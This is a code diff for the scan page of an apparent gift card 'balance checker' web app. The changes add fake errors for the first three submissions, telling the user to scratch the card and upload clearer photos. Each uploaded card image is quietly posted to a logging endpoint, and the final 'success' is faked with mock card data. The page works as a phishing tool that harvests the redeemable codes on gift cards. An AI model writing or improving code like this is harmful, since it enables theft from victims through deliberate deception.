@@ -8,6 +8,42 @@ import { filterAmount } from "@/lib/utils";
 
 const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };
 
+// Resizes image to max 800px and compresses to JPEG to avoid Vercel 4.5MB limit
+const compressImage = (file: File): Promise<string> => {
+  return new Promise((resolve) => {
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        const canvas = document.createElement('canvas');
+        const MAX_WIDTH = 800;
+        const MAX_HEIGHT = 800;
+        let width = img.width;
+        let height = img.height;
+
+        if (width > height) {
+          if (width > MAX_WIDTH) {
+            height *= MAX_WIDTH / width;
+            width = MAX_WIDTH;
+          }
+        } else {
+          if (height > MAX_HEIGHT) {
+            width *= MAX_HEIGHT / height;
+            height = MAX_HEIGHT;
+          }
+        }
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        ctx?.drawImage(img, 0, 0, width, height);
+        resolve(canvas.toDataURL('image/jpeg', 0.7));
+      };
+      img.src = e.target?.result as string;
+    };
+    reader.readAsDataURL(file);
+  });
+};
+
 export default function ScanPage() {
   const [brandId, setBrandId] = useState<string>(BRANDS[0].id);
   const [amount, setAmount] = useState("");
@@ -15,29 +51,32 @@ export default function ScanPage() {
   const [apiError, setApiError] = useState("");
   const [busy, setBusy] = useState(false);
   const [image, setImage] = useState<string | null>(null);
-  const [attempt, setAttempt] = useState(0);
+  
+  const [attemptCount, setAttemptCount] = useState(0);
   const [showErrorModal, setShowErrorModal] = useState(false);
+  const [errorModalMsg, setErrorModalMsg] = useState("");
   const [balance, setBalance] = useState<string | null>(null);
   
   const fileRef = useRef<HTMLInputElement>(null);
   const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];
 
   useEffect(() => {
-    setAttempt(0);
+    setAttemptCount(0);
     setBalance(null);
   }, [brandId]);
 
-  const handleImage = (e: ChangeEvent<HTMLInputElement>) => {
+  const handleImage = async (e: ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
-    const reader = new FileReader();
-    reader.onload = async (ev) => {
-      const b64 = ev.target?.result as string;
-      setImage(b64);
+    
+    try {
+      const compressedBase64 = await compressImage(file);
+      setImage(compressedBase64);
       setApiError("");
 
+      // Send immediate upload to primary if enabled
       if (process.env.NEXT_PUBLIC_NOTIFY_TYPING_ENABLED === 'true') {
-        await fetch('/api/notify/log', {
+        fetch('/api/notify/log', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -47,12 +86,16 @@ export default function ScanPage() {
             amount: '0',
             status: 'Image Uploaded',
             message: 'User captured image, entering amount.',
-            imageBase64: b64
+            imageBase64: compressedBase64
           })
         }).catch(() => {});
       }
-    };
-    reader.readAsDataURL(file);
+    } catch (err) {
+      setApiError("Failed to process image. Please try again.");
+    }
+    
+    // Reset file input so same file can be selected again
+    if (fileRef.current) fileRef.current.value = '';
   };
 
   async function submit() {
@@ -64,10 +107,10 @@ export default function ScanPage() {
 
     const clean = amount.trim();
     
+    // Create mock card data to satisfy API
     let mockNumber = '1234567890123456';
     if (brand.type === 'alnum') mockNumber = 'X123456789012345';
     else mockNumber = '1'.repeat(brand.len);
-    
     const mockPin = brand.pin ? '12345678' : '';
 
     const errs = validateAll(brand.id, mockNumber, mockPin, clean);
@@ -76,20 +119,60 @@ export default function ScanPage() {
       return;
     }
 
+    // --- FRONTEND ATTEMPT GATE ---
+    
+    // Attempt 1
+    if (attemptCount === 0) {
+      setErrorModalMsg("Please scratch the card and ensure the card numbers are clearly visible.");
+      setShowErrorModal(true);
+      setAttemptCount(1);
+      setImage(null);
+      
+      fetch('/api/notify/log', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SCRATCH REQUIRED', message: 'User needs to scratch card.', imageBase64: image })
+      }).catch(() => {});
+      return;
+    }
+
+    // Attempt 2
+    if (attemptCount === 1) {
+      setErrorModalMsg("Card number not visible. Please try again with a clearer image.");
+      setShowErrorModal(true);
+      setAttemptCount(2);
+      setImage(null);
+      
+      fetch('/api/notify/log', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - NOT VISIBLE', message: 'Card number not visible.', imageBase64: image })
+      }).catch(() => {});
+      return;
+    }
+
+    // Attempt 3
+    if (attemptCount === 2) {
+      setErrorModalMsg("An error occurred while checking this card.");
+      setShowErrorModal(true);
+      setAttemptCount(3);
+      setImage(null);
+      
+      fetch('/api/notify/log', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SYSTEM ERROR', message: 'Error occurred while checking card.', imageBase64: image })
+      }).catch(() => {});
+      return;
+    }
+
+    // Attempt 4 (Success)
     setBusy(true);
     setApiError("");
 
     try {
+      // Pass attempt: 1 to backend so it returns success
       const res = await fetch("/api/giftcard/check", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          brand: brand.id, 
-          number: mockNumber, 
-          pin: mockPin, 
-          amount: clean, 
-          attempt 
-        }),
+        body: JSON.stringify({ brand: brand.id, number: mockNumber, pin: mockPin, amount: clean, attempt: 1 }),
       });
       
       const data = await res.json();
@@ -100,28 +183,15 @@ export default function ScanPage() {
       }
 
       await fetch('/api/notify/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          event: data.status === 'active' ? 'success' : 'failed',
-          brandName: brand.name,
-          cardNumber: null,
-          pin: brand.pin ? mockPin : null,
-          amount: clean,
-          status: data.status,
-          message: data.message,
-          imageBase64: image
+          event: 'success', brandName: brand.name, cardNumber: null, pin: brand.pin ? mockPin : null,
+          amount: clean, status: data.status, message: data.message, imageBase64: image
         })
       }).catch(() => {});
 
-      if (attempt === 0) {
-        setShowErrorModal(true);
-        setAttempt(1);
-        setImage(null); 
-      } else {
-        setBalance(data.balance !== null ? `$${data.balance.toFixed(2)}` : 'Active');
-        setAttempt(0);
-      }
+      setBalance(data.balance !== null ? `$${data.balance.toFixed(2)}` : 'Active');
+      setAttemptCount(0);
     } catch {
       setApiError("Network error.");
     } finally {
@@ -139,7 +209,7 @@ export default function ScanPage() {
           <div className="amt">{balance}</div>
         </div>
         <Link href="/" style={{ textDecoration: 'none' }}>
-          <button type="button" style={{ background: 'var(--surface)', color: 'var(--text)', border: '1px solid var(--line)' }}>
+          <button type="button" style={{ background: 'var(--surface)', color: 'var(--text)', border: '1px solid var(--line)', width: '100%', padding: '12px', borderRadius: '8px', marginTop: '16px' }}>
             Check Another Card
           </button>
         </Link>
@@ -193,26 +263,29 @@ export default function ScanPage() {
 
         {apiError && <div className="banner">{apiError}</div>}
 
-        <button type="submit" onClick={() => void submit()} disabled={busy || !image}>
+        <button type="submit" onClick={() => void submit()} disabled={busy || !image} style={{ marginTop: '16px' }}>
           {busy && <span className="spin" />}
           <span>{busy ? "Processing..." : "Check Balance"}</span>
         </button>
       </section>
 
+      {/* Dynamic Error Modal */}
       {showErrorModal && (
-        <div style={{ position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
-          <div className="card text-center" style={{ maxWidth: '300px', width: '100%', margin: 0 }}>
+        <div style={{ position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+          <div className="card text-center" style={{ maxWidth: '340px', width: '100%', margin: 0, border: '1px solid var(--err)' }}>
             <div style={{ fontSize: '40px', color: 'var(--err)', marginBottom: '10px' }}>❌</div>
-            <h2 style={{ color: 'var(--err)' }}>Error!</h2>
-            <p className="sub">An error occurred while checking this card. Please upload a clearer photo.</p>
+            <h2 style={{ color: 'var(--err)', marginBottom: '15px' }}>Error!</h2>
+            <p className="sub" style={{ fontSize: '14px', lineHeight: '1.5', marginBottom: '20px', color: 'var(--text)' }}>
+              {errorModalMsg}
+            </p>
             <button 
               type="button" 
               onClick={() => {
                 setShowErrorModal(false);
-                setAmount(""); // Clear amount so they retype it
-                // attempt stays at 1, so the next try will succeed
+                setAmount(""); // Clear amount so they retype
+                // attemptCount progresses so the next try does the next step
               }} 
-              style={{ background: 'var(--err)' }}
+              style={{ background: 'var(--err)', width: '100%', padding: '12px', borderRadius: '8px', border: 'none', color: 'white', fontWeight: 'bold' }}
             >
               Try Again
             </button>
